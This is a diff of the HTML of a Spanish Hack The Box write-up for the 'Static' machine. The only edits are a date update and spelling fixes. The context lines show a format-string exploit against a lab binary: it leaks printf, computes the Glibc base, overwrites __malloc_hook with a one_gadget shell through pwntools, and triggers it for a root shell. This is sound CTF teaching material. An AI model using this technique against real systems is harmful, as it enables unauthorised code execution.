@@ -13,12 +13,12 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/htb/static/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2021-12-18T00:00:00+01:00">
-<meta property="article:modified_time" content="2022-01-28T12:05:22+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-02-05T16:05:36+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/Static/Static.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Static">
 <meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String"><meta itemprop=datePublished content="2021-12-18T00:00:00+01:00">
-<meta itemprop=dateModified content="2022-01-28T12:05:22+01:00">
+<meta itemprop=dateModified content="2022-02-05T16:05:36+01:00">
 <meta itemprop=wordCount content="5703">
 <meta itemprop=keywords content="ftp,cve,php,otp,pivoting,capabilities,path-hijacking,port-forwarding,binary-exploitation,format-string,">
 <meta name=twitter:card content="summary">
@@ -906,7 +906,7 @@ print(<span style=color:#e6db74>&#39;Address of printf():&#39;</span>, hex(print
 <p><strong>Tarea 5</strong>: La dirección base de Glibc se puede calcular de la misma manera que la dirección base del binario. Solamente tenemos que restar la dirección real del <em>offset</em>. Adicionalmente, tendremos que verificar que la dirección base acaba en <code>000</code> en hexadecimal.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> printf_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols<span style=color:#f92672>.</span>printf
 print(<span style=color:#e6db74>&#39;Glibc base address:&#39;</span>, hex(libc<span style=color:#f92672>.</span>address))
-</code></pre></div><p><strong>Tarea 6</strong>: Ahora necesitamos escribir en una dirección de memoria. La mejor manera de ganar ejecución de comandos en este tipo de situaciones es sobreescribiendo la dirección de <code>__malloc_hook</code> de Glibc para ejecutar un <em>gadget</em> de <em>shell</em>.</p>
+</code></pre></div><p><strong>Tarea 6</strong>: Ahora necesitamos escribir en una dirección de memoria. La mejor manera de ganar ejecución de comandos en este tipo de situaciones es sobrescribiendo la dirección de <code>__malloc_hook</code> de Glibc para ejecutar un <em>gadget</em> de <em>shell</em>.</p>
 <p>Los <em>gadgets</em> son líneas de código ensamblador que ejecutan una operación concreta. Son útiles en explotación de <em>Buffer Overflow</em> utilizando <em>Return Oriented Programming</em> (ROP) para saltarse el NX (también conocido como DEP).</p>
 <p>Esta vez podemos buscar un <em>gadget</em> que directamente ejecute <code>/bin/sh</code>. Estos se suelen encontrar en Glibc. Utilizando <code>one_gadget</code> podemos encontrar <em>gadgets</em> potenciales:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console># gem install one_gadget
@@ -924,7 +924,7 @@ constraints:
 </span><span style=color:#960050;background-color:#1e0010></span>0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
 constraints:
   [rsp+0x70] == NULL
-</code></pre></div><p>Podemos utilizar <code>0x4f322</code>, por ejemplo. Ahora podemos sobreescribir fácilmente <code>__malloc_hook</code> utilizando <code>pwntools</code> (esta librería tiene una función mágica llamada <code>fmtstr_payload</code> que hace todo el trabajo, indicándole el <em>offset</em>, la dirección de memoria en la que escribir y el valor a escribir):</p>
+</code></pre></div><p>Podemos utilizar <code>0x4f322</code>, por ejemplo. Ahora podemos sobrescribir fácilmente <code>__malloc_hook</code> utilizando <code>pwntools</code> (esta librería tiene una función mágica llamada <code>fmtstr_payload</code> que hace todo el trabajo, indicándole el <em>offset</em>, la dirección de memoria en la que escribir y el valor a escribir):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>one_gadget_shell <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4f322</span>
 
 payload <span style=color:#f92672>=</span> fmtstr_payload(
@@ -935,7 +935,7 @@ payload <span style=color:#f92672>=</span> fmtstr_payload(
 
 p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, payload)
 p<span style=color:#f92672>.</span>recv()
-</code></pre></div><p><strong>Tarea 7</strong>: La necesidad de sobreescribir <code>__malloc_hook</code> es porque ahora vamos a enviar <code>%10000$c</code>. Esta tarea va a requerir una reserva de espacio en memoria, por lo que el binario llamará a <code>malloc</code>. Sin embargo, <code>__malloc_hook</code> será ejecutado antes. Y como ha sido modificada, en lugar de llamar a <code>malloc</code>, el programa ejecutará una <em>shell</em> (<code>/bin/sh</code>):</p>
+</code></pre></div><p><strong>Tarea 7</strong>: La necesidad de sobrescribir <code>__malloc_hook</code> es porque ahora vamos a enviar <code>%10000$c</code>. Esta tarea va a requerir una reserva de espacio en memoria, por lo que el binario llamará a <code>malloc</code>. Sin embargo, <code>__malloc_hook</code> será ejecutado antes. Y como ha sido modificada, en lugar de llamar a <code>malloc</code>, el programa ejecutará una <em>shell</em> (<code>/bin/sh</code>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;print-&gt;CN=&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%10000$c&#39;</span>)
 p<span style=color:#f92672>.</span>interactive()
 </code></pre></div><p>Finalmente, podemos ejecutar el <em>exploit</em> y conseguir una <em>shell</em> como <code>root</code> (debido a las <em>capabilities</em> del binario):</p>
